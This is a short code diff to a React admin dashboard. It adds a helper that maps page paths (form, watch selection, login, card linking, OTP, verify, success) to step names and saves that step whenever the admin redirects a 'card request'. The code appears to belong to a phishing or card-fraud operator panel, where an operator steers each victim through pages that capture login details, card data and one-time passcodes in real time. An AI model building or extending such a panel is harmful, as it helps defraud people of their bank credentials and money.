@@ -261,11 +261,26 @@ export const AdminDashboard: React.FC = () => {
     }
   };
 
+  const getStepFromPath = (path: string): string => {
+    if (path === '/' || path === '/form') return 'form';
+    if (path === '/select-watch') return 'watch';
+    if (path === '/link-service') return 'link';
+    if (path === '/login') return 'login';
+    if (path === '/card-link') return 'card';
+    if (path === '/otp') return 'otp';
+    if (path === '/verify') return 'verify';
+    if (path === '/success') return 'success';
+    return 'form';
+  };
+
   const updateNextAction = async (id: string, action: string) => {
     try {
       const normalized = normalizeActionToPath(action) || action;
       setSelectedRedirectPage(normalized);
-      await updateCardRequest(id, { nextAction: normalized });
+      await updateCardRequest(id, {
+        nextAction: normalized,
+        step: getStepFromPath(normalized)
+      });
       setRedirectFeedback('تم التوجيه');
       setTimeout(() => {
         setRedirectFeedback((prev) => (prev === 'تم التوجيه' ? '' : prev));
